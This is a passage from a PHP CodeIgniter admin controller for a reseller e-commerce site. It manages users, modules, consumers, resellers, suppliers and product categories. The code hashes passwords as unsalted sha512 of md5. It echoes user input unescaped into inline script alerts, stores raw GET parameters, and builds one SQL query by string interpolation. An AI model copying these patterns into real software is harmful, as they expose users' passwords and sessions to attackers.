                                    'blokir'=>$this->db->escape_str($this->input->post('h')));
            }elseif ($hasil['file_name']!='' AND $this->input->post('b') ==''){
                    $data = array('username'=>$this->db->escape_str($this->input->post('a')),
                                    'nama_lengkap'=>$this->db->escape_str($this->input->post('c')),
                                    'email'=>$this->db->escape_str($this->input->post('d')),
                                    'no_telp'=>$this->db->escape_str($this->input->post('e')),
                                    'foto'=>$hasil['file_name'],
                                    'blokir'=>$this->db->escape_str($this->input->post('h')));
            }elseif ($hasil['file_name']=='' AND $this->input->post('b') !=''){
                    $data = array('username'=>$this->db->escape_str($this->input->post('a')),
                                    'password'=>hash("sha512", md5($this->input->post('b'))),
                                    'nama_lengkap'=>$this->db->escape_str($this->input->post('c')),
                                    'email'=>$this->db->escape_str($this->input->post('d')),
                                    'no_telp'=>$this->db->escape_str($this->input->post('e')),
                                    'blokir'=>$this->db->escape_str($this->input->post('h')));
            }elseif ($hasil['file_name']!='' AND $this->input->post('b') !=''){
                    $data = array('username'=>$this->db->escape_str($this->input->post('a')),
                                    'password'=>hash("sha512", md5($this->input->post('b'))),
                                    'nama_lengkap'=>$this->db->escape_str($this->input->post('c')),
                                    'email'=>$this->db->escape_str($this->input->post('d')),
                                    'no_telp'=>$this->db->escape_str($this->input->post('e')),
                                    'foto'=>$hasil['file_name'],
                                    'blokir'=>$this->db->escape_str($this->input->post('h')));
            }
            $where = array('username' => $this->input->post('id'));
            $this->model_app->update('users', $data, $where);

              $mod=count($this->input->post('modul'));
              $modul=$this->input->post('modul');
              for($i=0;$i<$mod;$i++){
                $datam = array('id_session'=>$this->input->post('ids'),
                              'id_modul'=>$modul[$i]);
                $this->model_app->insert('users_modul',$datam);
              }

			redirect($this->uri->segment(1).'/edit_manajemenuser/'.$this->input->post('id'));
		}else{
            if ($this->session->username==$this->uri->segment(3) OR $this->session->level=='admin'){
                $proses = $this->model_app->edit('users', array('username' => $id))->row_array();
                $akses = $this->model_app->view_join_where('users_modul','modul','id_modul', array('id_session' => $proses['id_session']),'id_umod','DESC');
                $modul = $this->model_app->view_where_ordering('modul', array('publish' => 'Y','status' => 'user'), 'id_modul','DESC');
                $data = array('rows' => $proses, 'record' => $modul, 'akses' => $akses);
    			$this->template->load('administrator/template','administrator/mod_users/view_users_edit',$data);
            }else{
                redirect($this->uri->segment(1).'/edit_manajemenuser/'.$this->session->username);
            }
		}
	}

	function delete_manajemenuser(){
        cek_session_akses('manajemenuser',$this->session->id_session);
		$id = array('username' => $this->uri->segment(3));
        $this->model_app->delete('users',$id);
		redirect($this->uri->segment(1).'/manajemenuser');
	}

    function delete_akses(){
        cek_session_admin();
        $id = array('id_umod' => $this->uri->segment(3));
        $this->model_app->delete('users_modul',$id);
        redirect($this->uri->segment(1).'/edit_manajemenuser/'.$this->uri->segment(4));
    }

	

	// Controller Modul Modul

	function manajemenmodul(){
		cek_session_akses('manajemenmodul',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('modul','id_modul','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('modul',array('username'=>$this->session->username),'id_modul','DESC');
        }
		$this->template->load('administrator/template','administrator/mod_modul/view_modul',$data);
	}

	function tambah_manajemenmodul(){
		cek_session_akses('manajemenmodul',$this->session->id_session);
		if (isset($_POST['submit'])){
			$data = array('nama_modul'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>$this->session->username,
                        'link'=>$this->db->escape_str($this->input->post('b')),
                        'static_content'=>'',
                        'gambar'=>'',
                        'publish'=>$this->db->escape_str($this->input->post('c')),
                        'status'=>$this->db->escape_str($this->input->post('e')),
                        'aktif'=>$this->db->escape_str($this->input->post('d')),
                        'urutan'=>'0',
                        'link_seo'=>'');
            $this->model_app->insert('modul',$data);
			redirect($this->uri->segment(1).'/manajemenmodul');
		}else{
			$this->template->load('administrator/template','administrator/mod_modul/view_modul_tambah');
		}
	}

	function edit_manajemenmodul(){
		cek_session_akses('manajemenmodul',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
            $data = array('nama_modul'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>$this->session->username,
                        'link'=>$this->db->escape_str($this->input->post('b')),
                        'static_content'=>'',
                        'gambar'=>'',
                        'publish'=>$this->db->escape_str($this->input->post('c')),
                        'status'=>$this->db->escape_str($this->input->post('e')),
                        'aktif'=>$this->db->escape_str($this->input->post('d')),
                        'urutan'=>'0',
                        'link_seo'=>'');
            $where = array('id_modul' => $this->input->post('id'));
            $this->model_app->update('modul', $data, $where);
			redirect($this->uri->segment(1).'/manajemenmodul');
		}else{
            if ($this->session->level=='admin'){
                 $proses = $this->model_app->edit('modul', array('id_modul' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('modul', array('id_modul' => $id, 'username' => $this->session->username))->row_array();
            }
            $data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_modul/view_modul_edit',$data);
		}
	}

	function delete_manajemenmodul(){
        cek_session_akses('manajemenmodul',$this->session->id_session);
		if ($this->session->level=='admin'){
            $id = array('id_modul' => $this->uri->segment(3));
        }else{
            $id = array('id_modul' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('modul',$id);
		redirect($this->uri->segment(1).'/manajemenmodul');
	}



    // RESELLER MODUL ==============================================================================================================================================================================

        // Controller Modul Konsumen

    function konsumen(){
        cek_session_akses('konsumen',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('rb_konsumen','id_konsumen','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_konsumen/view_konsumen',$data);
    }

    function verifikasi_konsumen(){
        cek_session_akses('konsumen',$this->session->id_session);
        $data = array('token'=>$this->uri->segment(4));
        $where = array('id_konsumen' => $this->uri->segment(3));
        $this->model_app->update('rb_konsumen', $data, $where);
        redirect('administrator/konsumen');
    }

    function tambah_konsumen(){
        cek_session_akses('konsumen',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_user/';
            $config['allowed_types'] = 'gif|jpg|png|jpeg';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('gg');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('username'=>$this->input->post('aa'),
                            'password'=>hash("sha512", md5($this->input->post('a'))),
                            'nama_lengkap'=>$this->input->post('b'),
                            'email'=>$this->input->post('c'),
                            'jenis_kelamin'=>$this->input->post('d'),
                            'tanggal_lahir'=>$this->input->post('e'),
                            'alamat_lengkap'=>$this->input->post('g'),
                            'no_hp'=>$this->input->post('k'),
                            'kecamatan'=>$this->input->post('ia'),
                            'kota_id'=>$this->input->post('ga'),
                            'tanggal_daftar'=>date('Y-m-d'));
            }else{
                $data = array('username'=>$this->input->post('aa'),
                            'password'=>hash("sha512", md5($this->input->post('a'))),
                            'nama_lengkap'=>$this->input->post('b'),
                            'email'=>$this->input->post('c'),
                            'jenis_kelamin'=>$this->input->post('d'),
                            'tanggal_lahir'=>$this->input->post('e'),
                            'alamat_lengkap'=>$this->input->post('g'),
                            'no_hp'=>$this->input->post('k'),
                            'kecamatan'=>$this->input->post('ia'),
                            'kota_id'=>$this->input->post('ga'),
                            'foto'=>$hasil['file_name'],
                            'tanggal_daftar'=>date('Y-m-d'));
            }
            $this->model_app->insert('rb_konsumen',$data);
            redirect('administrator/konsumen');
        }else{
            $data['negara'] = $this->model_app->view_ordering('rb_provinsi','provinsi_id','DESC');
            $this->template->load('administrator/template','administrator/additional/mod_konsumen/view_konsumen_tambah',$data);
        }
    }

    function edit_konsumen(){
        cek_session_akses('konsumen',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_user/';
            $config['allowed_types'] = 'gif|jpg|png|jpeg';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('gg');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                if (trim($this->input->post('a')) != ''){
                    $data = array('password'=>hash("sha512", md5($this->input->post('a'))),
                                    'nama_lengkap'=>$this->db->escape_str(strip_tags($this->input->post('b'))),
                                    'email'=>$this->db->escape_str(strip_tags($this->input->post('c'))),
                                    'jenis_kelamin'=>$this->db->escape_str($this->input->post('d')),
                                    'tanggal_lahir'=>$this->db->escape_str($this->input->post('e')),
                                    'alamat_lengkap'=>$this->db->escape_str(strip_tags($this->input->post('g'))),
                                    'kecamatan_id'=>$this->input->post('kecamatan_id'),
                                    'kota_id'=>$this->input->post('kota_id'),
                                    'provinsi_id'=>$this->input->post('provinsi_id'),
                                    'no_hp'=>$this->input->post('k'));
                }else{
                   $data = array('nama_lengkap'=>$this->db->escape_str(strip_tags($this->input->post('b'))),
                                    'email'=>$this->db->escape_str(strip_tags($this->input->post('c'))),
                                    'jenis_kelamin'=>$this->db->escape_str($this->input->post('d')),
                                    'tanggal_lahir'=>$this->db->escape_str($this->input->post('e')),
                                    'alamat_lengkap'=>$this->db->escape_str(strip_tags($this->input->post('g'))),
                                    'kecamatan_id'=>$this->input->post('kecamatan_id'),
                                    'kota_id'=>$this->input->post('kota_id'),
                                    'provinsi_id'=>$this->input->post('provinsi_id'),
                                    'no_hp'=>$this->input->post('k'));
                }
            }else{
                if (trim($this->input->post('a')) != ''){
                    $data = array('password'=>hash("sha512", md5($this->input->post('a'))),
                                    'nama_lengkap'=>$this->db->escape_str(strip_tags($this->input->post('b'))),
                                    'email'=>$this->db->escape_str(strip_tags($this->input->post('c'))),
                                    'jenis_kelamin'=>$this->db->escape_str($this->input->post('d')),
                                    'tanggal_lahir'=>$this->db->escape_str($this->input->post('e')),
                                    'alamat_lengkap'=>$this->db->escape_str(strip_tags($this->input->post('g'))),
                                    'kecamatan_id'=>$this->input->post('kecamatan_id'),
                                    'kota_id'=>$this->input->post('kota_id'),
                                    'provinsi_id'=>$this->input->post('provinsi_id'),
                                    'no_hp'=>$this->input->post('k'),
                                    'foto'=>$hasil['file_name']);
                }else{
                   $data = array('nama_lengkap'=>$this->db->escape_str(strip_tags($this->input->post('b'))),
                                    'email'=>$this->db->escape_str(strip_tags($this->input->post('c'))),
                                    'jenis_kelamin'=>$this->db->escape_str($this->input->post('d')),
                                    'tanggal_lahir'=>$this->db->escape_str($this->input->post('e')),
                                    'alamat_lengkap'=>$this->db->escape_str(strip_tags($this->input->post('g'))),
                                    'kecamatan_id'=>$this->input->post('kecamatan_id'),
                                    'kota_id'=>$this->input->post('kota_id'),
                                    'provinsi_id'=>$this->input->post('provinsi_id'),
                                    'no_hp'=>$this->input->post('k'),
                                    'foto'=>$hasil['file_name']);
                }
            }
            $where = array('id_konsumen' => $this->input->post('id'));
            $this->model_app->update('rb_konsumen', $data, $where);
            redirect('administrator/detail_konsumen/'.$this->input->post('id'));
        }else{
            $data['rows'] = $this->model_reseller->profile_konsumen($id)->row_array();
            $row = $this->model_reseller->profile_konsumen($id)->row_array();
            $data['provinsi'] = $this->model_app->view_ordering('rb_provinsi','provinsi_id','ASC');
            $data['kota'] = $this->model_app->view_ordering('rb_kota','kota_id','ASC');
            $data['rowse'] = $this->db->query("SELECT provinsi_id FROM rb_kota where kota_id='$row[kota_id]'")->row_array();
            $this->template->load('administrator/template','administrator/additional/mod_konsumen/view_konsumen_edit',$data);
        }
    }
    
    function detail_konsumen(){
        cek_session_akses('konsumen',$this->session->id_session);
        $id = $this->uri->segment(3);
        $pembelian = $this->model_reseller->reseller_pembelian(reseller($id),'admin');
        $penjualan = $this->model_reseller->penjualan_list_konsumen(reseller($id),'reseller');

        $record = $this->model_reseller->orders_report($id,'reseller');
        $edit = $this->model_reseller->profile_konsumen($id)->row_array();
        $data = array('rows' => $edit,'record'=>$record,'pembelian'=>$pembelian,'penjualan'=>$penjualan);
        $this->template->load('administrator/template','administrator/additional/mod_konsumen/view_konsumen_detail',$data);
    }

    function delete_konsumen(){
        cek_session_akses('konsumen',$this->session->id_session);
        $id = array('id_konsumen' => $this->uri->segment(3));
        $ids = array('id_reseller' => reseller($this->uri->segment(3)));
        $this->model_app->delete('rb_konsumen',$id);
        $this->model_app->delete('rb_reseller',$id);
        $this->model_app->delete('rb_konsumen_alamat',$id);
        $this->model_app->delete('rb_konsumen_detail',$id);
        $this->model_app->delete('rb_konsumen_simpan',$id);
        $this->model_app->delete('rb_produk',$ids);
        $this->model_app->delete('rb_produk_diskon',$ids);
        redirect('administrator/konsumen');
    }

    // Controller Modul Reseller
    function reseller(){
        cek_session_akses('reseller',$this->session->id_session);
        if (isset($_GET['paket'])){
            if ($_GET['paket']=='Y'){
                $hari = $_GET['durasi'];
                $tgl1 = date('Y-m-d');// pendefinisian tanggal awal 
                $tanggal_paket = date('Y-m-d', strtotime('+'.$hari.' days', strtotime($tgl1)));
            }elseif($_GET['paket']=='N'){
                $tanggal_paket = date('Y-m-d');
            }
            $data = array('status'=>$_GET['paket'],
                          'expire_date'=>$tanggal_paket);
            $where = array('id_reseller' => $this->input->get('id'));
            $this->model_app->update('rb_reseller_paket', $data, $where);
            redirect('administrator/reseller');
        }
        $data['record'] = $this->model_app->view_ordering('rb_reseller','id_reseller','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_reseller/view_reseller',$data);
    }

    function tambah_reseller(){
        cek_session_akses('reseller',$this->session->id_session);
        if (isset($_POST['submit'])){
            $cek  = $this->model_app->view_where('rb_reseller',array('username'=>$this->input->post('a')))->num_rows();
            if ($cek >= 1){
                $username = $this->input->post('a');
                echo "<script>window.alert('Maaf, Username $username sudah dipakai oleh orang lain!');
                                  window.location=('index.php?view=login')</script>";
            }else{
                $route = array('administrator','agenda','auth','berita','contact','download','gallery','konfirmasi','main','members','page','produk','reseller','testimoni','video');
                if (in_array($this->input->post('a'), $route)){
                    $username = $this->input->post('a');
                    echo "<script>window.alert('Maaf, Username $username sudah dipakai oleh orang lain!');
                                      window.location=('".base_url()."/".$this->input->post('i')."')</script>";
                }else{
                $config['upload_path'] = 'asset/foto_user/';
                $config['allowed_types'] = 'gif|jpg|png|jpeg';
                $config['max_size'] = '5000'; // kb
                $this->load->library('upload', $config);
                $this->upload->do_upload('gg');
                $hasil=$this->upload->data();
                if ($hasil['file_name']==''){
                    $data = array('username'=>$this->input->post('a'),
                                'password'=>hash("sha512", md5($this->input->post('b'))),
                                'nama_reseller'=>$this->input->post('c'),
                                'jenis_kelamin'=>$this->input->post('d'),
                                'alamat_lengkap'=>$this->input->post('e'),
                                'kecamatan_id'=>$this->input->post('kecamatan_id'),
                                'kota_id'=>$this->input->post('kota_id'),
                                'provinsi_id'=>$this->input->post('provinsi_id'),
                                'no_telpon'=>$this->input->post('f'),
                                'email'=>$this->input->post('g'),
                                'kode_pos'=>$this->input->post('h'),
                                'keterangan'=>$this->input->post('i'),
                                'referral'=>$this->input->post('j'),
                                'tanggal_daftar'=>date('Y-m-d'));
                }else{
                    $data = array('username'=>$this->input->post('a'),
                                'password'=>hash("sha512", md5($this->input->post('b'))),
                                'nama_reseller'=>$this->input->post('c'),
                                'jenis_kelamin'=>$this->input->post('d'),
                                'alamat_lengkap'=>$this->input->post('e'),
                                'kecamatan_id'=>$this->input->post('kecamatan_id'),
                                'kota_id'=>$this->input->post('kota_id'),
                                'provinsi_id'=>$this->input->post('provinsi_id'),
                                'no_telpon'=>$this->input->post('f'),
                                'email'=>$this->input->post('g'),
                                'kode_pos'=>$this->input->post('h'),
                                'keterangan'=>$this->input->post('i'),
                                'foto'=>$hasil['file_name'],
                                'referral'=>$this->input->post('j'),
                                'tanggal_daftar'=>date('Y-m-d'));
                }
                $this->model_app->insert('rb_reseller',$data);
                redirect('administrator/reseller');
                }
            }
        }else{
            $this->template->load('administrator/template','administrator/additional/mod_reseller/view_reseller_tambah');
        }
    }

    function edit_reseller(){
        cek_session_akses('reseller',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_user/';
            $config['allowed_types'] = 'gif|jpg|png|jpeg';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('gg');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('nama_reseller'=>$this->input->post('c'),
                            'alamat_lengkap'=>$this->input->post('e'),
                            'kecamatan_id'=>$this->input->post('kecamatan_id'),
                            'kota_id'=>$this->input->post('kota_id'),
                            'provinsi_id'=>$this->input->post('provinsi_id'),
                            'no_telpon'=>$this->input->post('f'),
                            'keterangan'=>$this->input->post('i'),
                            'referral'=>$this->input->post('j'));
            }else{
                $data = array('nama_reseller'=>$this->input->post('c'),
                            'alamat_lengkap'=>$this->input->post('e'),
                            'kecamatan_id'=>$this->input->post('kecamatan_id'),
                            'kota_id'=>$this->input->post('kota_id'),
                            'provinsi_id'=>$this->input->post('provinsi_id'),
                            'no_telpon'=>$this->input->post('f'),
                            'keterangan'=>$this->input->post('i'),
                            'foto'=>$hasil['file_name'],
                            'referral'=>$this->input->post('j'));
            }
            $where = array('id_reseller' => $this->input->post('id'));
            $this->model_app->update('rb_reseller', $data, $where);
            $cek = $this->model_app->view_where('rb_reseller',array('id_reseller'=>$this->input->post('id')))->row_array();
            redirect('administrator/detail_konsumen/'.$cek['id_konsumen']);
        }else{
            $edit = $this->model_app->edit('rb_reseller',array('id_reseller'=>$id))->row_array();
            $data = array('rows' => $edit);
            $this->template->load('administrator/template','administrator/additional/mod_reseller/view_reseller_edit',$data);
        }
    }

    function verifikasi_reseller(){
        cek_session_akses('reseller',$this->session->id_session);
        $data = array('verifikasi'=>$this->uri->segment(4));
        $where = array('id_reseller' => $this->uri->segment(3));
        $this->model_app->update('rb_reseller', $data, $where);
        redirect('administrator/reseller');
    }
    
    function detail_reseller(){
        cek_session_akses('reseller',$this->session->id_session);
        $id = $this->uri->segment(3);
        $record = $this->model_reseller->reseller_pembelian($id,'admin');
        $penjualan = $this->model_reseller->penjualan_list_konsumen($id,'reseller');
        $edit = $this->model_app->edit('rb_reseller',array('id_reseller'=>$id))->row_array();
        $reward = $this->model_app->view_ordering('rb_reward','id_reward','ASC');

        $data = array('rows' => $edit,'record'=>$record,'penjualan'=>$penjualan,'reward'=>$reward);
        $this->template->load('administrator/template','administrator/additional/mod_reseller/view_reseller_detail',$data);
    }

    function delete_reseller(){
        cek_session_akses('reseller',$this->session->id_session);
        $id = array('id_reseller' => $this->uri->segment(3));
        $this->model_app->delete('rb_reseller',$id);
        redirect('administrator/reseller');
    }


    // Controller Modul Supplier

    function supplier(){
        cek_session_akses('supplier',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('rb_supplier','id_supplier','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_supplier/view_supplier',$data);
    }

    function tambah_supplier(){
        cek_session_akses('supplier',$this->session->id_session);
        if (isset($_POST['submit'])){
            $data = array('nama_supplier'=>$this->input->post('a'),
                        'kontak_person'=>$this->input->post('b'),
                        'alamat_lengkap'=>$this->input->post('c'),
                        'no_hp'=>$this->input->post('d'),
                        'alamat_email'=>$this->input->post('e'),
                        'kode_pos'=>$this->input->post('f'),
                        'no_telpon'=>$this->input->post('g'),
                        'fax'=>$this->input->post('h'),
                        'keterangan'=>$this->input->post('i'));
            $this->model_app->insert('rb_supplier',$data);
            redirect('administrator/supplier');
        }else{
            $this->template->load('administrator/template','administrator/additional/mod_supplier/view_supplier_tambah',$data);
        }
    }

    function edit_supplier(){
        cek_session_akses('supplier',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
           $data = array('nama_supplier'=>$this->input->post('a'),
                        'kontak_person'=>$this->input->post('b'),
                        'alamat_lengkap'=>$this->input->post('c'),
                        'no_hp'=>$this->input->post('d'),
                        'alamat_email'=>$this->input->post('e'),
                        'kode_pos'=>$this->input->post('f'),
                        'no_telpon'=>$this->input->post('g'),
                        'fax'=>$this->input->post('h'),
                        'keterangan'=>$this->input->post('i'));
            $where = array('id_supplier' => $this->input->post('id'));
            $this->model_app->update('rb_supplier', $data, $where);
            redirect('administrator/detail_supplier/'.$this->input->post('id'));
        }else{
            $data['rows'] = $this->model_app->view_where('rb_supplier',array('id_supplier'=>$id))->row_array();
            $this->template->load('administrator/template','administrator/additional/mod_supplier/view_supplier_edit',$data);
        }
    }
    
    function detail_supplier(){
        cek_session_akses('supplier',$this->session->id_session);
        $id = $this->uri->segment(3);
        $edit = $this->model_app->view_where('rb_supplier',array('id_supplier'=>$id))->row_array();
        $data = array('rows' => $edit);
        $this->template->load('administrator/template','administrator/additional/mod_supplier/view_supplier_detail',$data);
    }

    function delete_supplier(){
        cek_session_akses('supplier',$this->session->id_session);
        $id = array('id_supplier' => $this->uri->segment(3));
        $this->model_app->delete('rb_supplier',$id);
        redirect('administrator/supplier');
    }


    // Controller Modul Kategori Produk

    function kategori_produk(){
        cek_session_akses('kategori_produk',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('rb_kategori_produk','id_kategori_produk','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_kategori_produk/view_kategori_produk',$data);
    }

    function tambah_kategori_produk(){
        cek_session_akses('kategori_produk',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_produk/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|jpeg';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);

            if($this->upload->do_upload('gambar')){
                $this->upload->do_upload('gambar');
                $hasil=$this->upload->data();
            }

            if($this->upload->do_upload('icon_image')){
                $this->upload->do_upload('icon_image');
                $hasil_icon=$this->upload->data();
            }

            if ($hasil['file_name']==''){
                if ($hasil_icon['file_name']==''){
                    $data = array('nama_kategori'=>$this->input->post('a'),
                                'urutan'=>$this->input->post('urutan'),
                                'icon_kode'=>$this->input->post('icon_kode'),
                                'kategori_seo'=>seo_title($this->input->post('a')));
                }else{
                    $data = array('nama_kategori'=>$this->input->post('a'),
                                'urutan'=>$this->input->post('urutan'),
                                'icon_kode'=>$this->input->post('icon_kode'),
                                'kategori_seo'=>seo_title($this->input->post('a')),
                                'icon_image'=>$hasil_icon['file_name']);
                }
            }else{
                if ($hasil_icon['file_name']==''){
                    $data = array('nama_kategori'=>$this->input->post('a'),
                                'kategori_seo'=>seo_title($this->input->post('a')),
                                'urutan'=>$this->input->post('urutan'),
                                'icon_kode'=>$this->input->post('icon_kode'),
                                'gambar'=>$hasil['file_name']);
                }else{
                    $data = array('nama_kategori'=>$this->input->post('a'),
                                'kategori_seo'=>seo_title($this->input->post('a')),
                                'urutan'=>$this->input->post('urutan'),
                                'icon_kode'=>$this->input->post('icon_kode'),
                                'icon_image'=>$hasil_icon['file_name'],
                                'gambar'=>$hasil['file_name']);
                }
            }
            $this->model_app->insert('rb_kategori_produk',$data);
            redirect('administrator/kategori_produk');
        }else{
            $this->template->load('administrator/template','administrator/additional/mod_kategori_produk/view_kategori_produk_tambah');
        }
    }

    function edit_kategori_produk(){
        cek_session_akses('kategori_produk',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_produk/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|jpeg';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);

            if($this->upload->do_upload('gambar')){
                $this->upload->do_upload('gambar');
                $hasil=$this->upload->data();
            }

            if($this->upload->do_upload('icon_image')){
                $this->upload->do_upload('icon_image');
                $hasil_icon=$this->upload->data();
            }
            if ($hasil['file_name']==''){
                if ($hasil_icon['file_name']==''){
                    $data = array('nama_kategori'=>$this->input->post('a'),
                                'urutan'=>$this->input->post('urutan'),
                                'mkolom'=>$this->input->post('mkolom'),
                                'icon_kode'=>$this->input->post('icon_kode'),
                                'kategori_seo'=>seo_title($this->input->post('a')));
                }else{
                    $data = array('nama_kategori'=>$this->input->post('a'),
                                'urutan'=>$this->input->post('urutan'),
                                'mkolom'=>$this->input->post('mkolom'),
                                'icon_kode'=>$this->input->post('icon_kode'),
                                'kategori_seo'=>seo_title($this->input->post('a')),
                                'icon_image'=>$hasil_icon['file_name']);   
                }
            }else{
                if ($hasil_icon['file_name']==''){
                    $data = array('nama_kategori'=>$this->input->post('a'),
                                'kategori_seo'=>seo_title($this->input->post('a')),
                                'urutan'=>$this->input->post('urutan'),
                                'mkolom'=>$this->input->post('mkolom'),
                                'icon_kode'=>$this->input->post('icon_kode'),
                                'gambar'=>$hasil['file_name']);
                }else{
                    $data = array('nama_kategori'=>$this->input->post('a'),
                                'kategori_seo'=>seo_title($this->input->post('a')),
                                'urutan'=>$this->input->post('urutan'),
                                'mkolom'=>$this->input->post('mkolom'),
                                'icon_kode'=>$this->input->post('icon_kode'),
                                'icon_image'=>$hasil_icon['file_name'],
                                'gambar'=>$hasil['file_name']);
                }
            }
            $where = array('id_kategori_produk' => $this->input->post('id'));
            $this->model_app->update('rb_kategori_produk', $data, $where);
            redirect('administrator/kategori_produk');
        }else{
            $edit = $this->model_app->edit('rb_kategori_produk',array('id_kategori_produk'=>$id))->row_array();
            $data = array('rows' => $edit);
            $this->template->load('administrator/template','administrator/additional/mod_kategori_produk/view_kategori_produk_edit',$data);
        }
    }

    function delete_kategori_produk(){
        cek_session_akses('kategori_produk',$this->session->id_session);
        $id = array('id_kategori_produk' => $this->uri->segment(3));
        $this->model_app->delete('rb_kategori_produk',$id);
        redirect('administrator/kategori_produk');
    }


    // Controller Modul Sub Kategori Produk

    function kategori_produk_sub(){
        cek_session_akses('kategori_produk_sub',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT a.*, b.nama_kategori FROM rb_kategori_produk_sub a JOIN rb_kategori_produk b ON a.id_kategori_produk=b.id_kategori_produk ORDER BY a.id_kategori_produk_sub DESC");
        $this->template->load('administrator/template','administrator/additional/mod_kategori_produk/view_kategori_produk_sub',$data);
    }

    function tambah_kategori_produk_sub(){
        cek_session_akses('kategori_produk_sub',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_produk/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|jpeg';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('icon_image');
            $hasil_icon=$this->upload->data();
            if ($hasil_icon['file_name']==''){
                $data = array('id_kategori_produk'=>$this->input->post('b'),
                            'nama_kategori_sub'=>$this->input->post('a'),
                            'icon_kode'=>$this->input->post('icon_kode'),
                            'kategori_seo_sub'=>seo_title($this->input->post('a')));
            }else{
                $data = array('id_kategori_produk'=>$this->input->post('b'),
                            'nama_kategori_sub'=>$this->input->post('a'),
                            'icon_kode'=>$this->input->post('icon_kode'),
                            'icon_image'=>$hasil_icon['file_name'],
                            'kategori_seo_sub'=>seo_title($this->input->post('a')));
            }
            $this->model_app->insert('rb_kategori_produk_sub',$data);
            redirect('administrator/kategori_produk_sub');
        }else{
            $this->template->load('administrator/template','administrator/additional/mod_kategori_produk/view_kategori_produk_tambah_sub');
        }
    }

    function edit_kategori_produk_sub(){
        cek_session_akses('kategori_produk_sub',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_produk/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|jpeg';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('icon_image');
            $hasil_icon=$this->upload->data();
            if ($hasil_icon['file_name']==''){
                $data = array('id_kategori_produk'=>$this->input->post('b'),
                            'nama_kategori_sub'=>$this->input->post('a'),
                            'mkolom_sub'=>$this->input->post('mkolom_sub'),
                            'icon_kode'=>$this->input->post('icon_kode'),
                            'kategori_seo_sub'=>seo_title($this->input->post('a')));
            }else{
                $data = array('id_kategori_produk'=>$this->input->post('b'),
                            'nama_kategori_sub'=>$this->input->post('a'),
                            'mkolom_sub'=>$this->input->post('mkolom_sub'),
                            'icon_kode'=>$this->input->post('icon_kode'),
                            'icon_image'=>$hasil_icon['file_name'],
                            'kategori_seo_sub'=>seo_title($this->input->post('a')));
            }
            $where = array('id_kategori_produk_sub' => $this->input->post('id'));
            $this->model_app->update('rb_kategori_produk_sub', $data, $where);
            redirect('administrator/kategori_produk_sub');
        }else{
            $edit = $this->model_app->edit('rb_kategori_produk_sub',array('id_kategori_produk_sub'=>$id))->row_array();
            $data = array('rows' => $edit);
            $this->template->load('administrator/template','administrator/additional/mod_kategori_produk/view_kategori_produk_edit_sub',$data);
        }
    }

    function delete_kategori_produk_sub(){
        cek_session_akses('kategori_produk_sub',$this->session->id_session);
        $id = array('id_kategori_produk_sub' => $this->uri->segment(3));
        $this->model_app->delete('rb_kategori_produk_sub',$id);
        redirect('administrator/kategori_produk_sub');
    }


    // Controller Modul Produk

    function produk(){
        cek_session_akses('produk',$this->session->id_session);
        $this->session->unset_userdata('sesi_produk');
        $data['record'] = $this->model_app->view_ordering('rb_produk','id_produk','DESC');
        $data['sitemap'] = $this->model_app->view_ordering_limit('rb_produk','id_produk','DESC',0,50);
        $this->load->view('administrator/sitemap',$data);
        $this->template->load('administrator/template','administrator/additional/mod_produk/view_produk',$data);
    }

    function tambah_produk(){
        cek_session_akses('produk',$this->session->id_session);
        if (isset($_POST['submit'])){
            if ($this->session->sesi_produk!=''){
                $rows = $this->db->query("SELECT GROUP_CONCAT(file_name SEPARATOR ';') as files FROM `img_comment` where id_comment='".$this->session->sesi_produk."'")->row_array();
                $fileName = $rows['files'];
            }else{
                $fileName = '';
            }

            if ($this->input->post('tag')!=''){
                $tag_seo = $this->input->post('tag');
                $tag=implode(',',$tag_seo);
            }else{
                $tag = '';
            }

            if (trim($fileName)!=''){
                $data = array('id_reseller'=>$this->input->post('id_reseller'),
                              'id_kategori_produk'=>$this->input->post('a'),
